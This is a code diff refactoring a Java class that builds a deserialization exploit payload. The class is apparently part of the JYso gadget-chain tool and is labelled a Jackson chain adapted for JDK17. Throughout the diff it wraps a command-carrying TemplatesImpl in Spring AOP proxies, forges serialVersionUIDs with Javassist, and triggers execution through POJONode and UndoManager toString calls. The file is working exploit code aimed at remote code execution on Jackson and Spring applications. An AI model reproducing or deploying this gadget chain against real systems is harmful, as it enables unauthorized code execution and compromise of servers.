@@ -25,13 +25,11 @@ import static com.qi4l.JYso.gadgets.utils.Reflections.setFieldValue;
 
 
 //Jackson2链的JDK17改造
+@SuppressWarnings({"rawtypes", "unchecked","unused"})
 @Dependencies({"spring-apo:6.2.10"})
 @Authors({Authors.JSJCW})
-public class Jackson3 implements ObjectPayload<Object> {
-    public static Object makeTemplatesImplAopProxy(String cmd) throws Exception {
-        AdvisedSupport advisedSupport = new AdvisedSupport();
-        advisedSupport.setTarget(Gadgets.createTemplatesImpl(cmd));
-
+public class Jackson3 implements ObjectPayload<Object>  {
+    static InvocationHandler setSuidSource(AdvisedSupport advisedSupport) throws Exception  {
         //<=6.0.23为6115154060221772279
         //>=6.1.0 为273003553246259276
         String sUID = "273003553246259276";
@@ -39,36 +37,33 @@ public class Jackson3 implements ObjectPayload<Object> {
                 "org.springframework.aop.framework.DefaultAdvisorChainFactory",
                 "private static final long serialVersionUID = " + sUID + "L;");
 
-        Object ctFactory = ctDefaultAdvisorChainFactory.toClass(new SuClassLoader()).newInstance();
+        Object ctFactory = ctDefaultAdvisorChainFactory.toClass(
+                new SuClassLoader(),SuClassLoader.class.getProtectionDomain()
+        ).newInstance();
         advisedSupport.setAdvisorChainFactory((AdvisorChainFactory) ctFactory);
 
         Constructor<?> constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
         constructor.setAccessible(true);
-        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
-        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);
+        return (InvocationHandler) constructor.newInstance(advisedSupport);
+    }
 
-        return proxy;
+    public static Object makeTemplatesImplAopProxy(String cmd) throws Exception {
+        AdvisedSupport advisedSupport = new AdvisedSupport();
+        advisedSupport.setTarget(Gadgets.createTemplatesImpl(cmd));
+
+        InvocationHandler handler = setSuidSource(advisedSupport);
+
+
+        return Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);
     }
 
     public static Object makeDatasourceAopProxy(Object templatesImpl) throws Exception {
         AdvisedSupport advisedSupport = new AdvisedSupport();
         advisedSupport.setTarget(templatesImpl);
 
-        //<=6.0.23为6115154060221772279
-        //>=6.1.0 为273003553246259276
-        String sUID = "273003553246259276";
-        CtClass ctDefaultAdvisorChainFactory = insertField(
-                "org.springframework.aop.framework.DefaultAdvisorChainFactory",
-                "private static final long serialVersionUID = " + sUID + "L;");
+        InvocationHandler handler = setSuidSource(advisedSupport);
 
-        Object ctFactory = ctDefaultAdvisorChainFactory.toClass(new SuClassLoader()).newInstance();
-        advisedSupport.setAdvisorChainFactory((AdvisorChainFactory) ctFactory);
-
-        Constructor<?> constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
-        constructor.setAccessible(true);
-        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
-        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{DataSource.class}, handler);
-        return proxy;
+        return Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{DataSource.class}, handler);
     }
 
     public static Object makeAopProxy(String singletonTargetSourceClassName, String advisedSupportClassName, String jdkDynamicAopProxy, Class superClass, Object targetObject) throws Exception {
@@ -79,8 +74,7 @@ public class Jackson3 implements ObjectPayload<Object> {
         Constructor<?> constructor = ThirdLibsClassLoader.loadClass_(jdkDynamicAopProxy).getConstructor(advisedSupportClazz);
         constructor.setAccessible(true);
         InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
-        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{superClass}, handler);
-        return proxy;
+        return Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{superClass}, handler);
     }
 
     public static Object getEventListenerList(Object obj) throws Exception {
@@ -90,7 +84,9 @@ public class Jackson3 implements ObjectPayload<Object> {
         CtClass ctEventListenerList = insertField(
                 "javax.swing.event.EventListenerList",
                 "private static final long serialVersionUID = -" + sUID1 + "L;");
-        Object list = ctEventListenerList.toClass(new SuClassLoader()).newInstance();
+        Object list = ctEventListenerList.toClass(
+                new SuClassLoader(),SuClassLoader.class.getProtectionDomain()
+        ).newInstance();
 
         //>=6.1.0 为-1045223116463488483
         //<=6.0.23为-2077529998244066750
@@ -98,7 +94,9 @@ public class Jackson3 implements ObjectPayload<Object> {
         CtClass ctUndoManager = insertField(
                 "javax.swing.undo.UndoManager",
                 "private static final long serialVersionUID = -" + sUID2 + "L;");
-        Object undomanager = ctUndoManager.toClass(new SuClassLoader()).newInstance();
+        Object undomanager = ctUndoManager.toClass(
+                new SuClassLoader(),SuClassLoader.class.getProtectionDomain()
+        ).newInstance();
 
         //取出UndoManager类的父类CompoundEdit类的edits属性里的vector对象，并把需要触发toString的类add进去。
         Vector vector = (Vector) getFieldValue(undomanager, "edits");
@@ -118,15 +116,6 @@ public class Jackson3 implements ObjectPayload<Object> {
         } catch (Exception ignored) {
 
         }
-
-        //ArrayList<Class> classes = new ArrayList<>();
-        //classes.add(TemplatesImpl.class);
-        //classes.add(POJONode.class);
-        //classes.add(EventListenerList.class);
-        //classes.add(Jackson3.class);
-        //classes.add(Field.class);
-        //classes.add(Method.class);
-        //new jdk17Bypass().bypassModule(classes);
 
 
         POJONode node = new POJONode(makeTemplatesImplAopProxy(command));
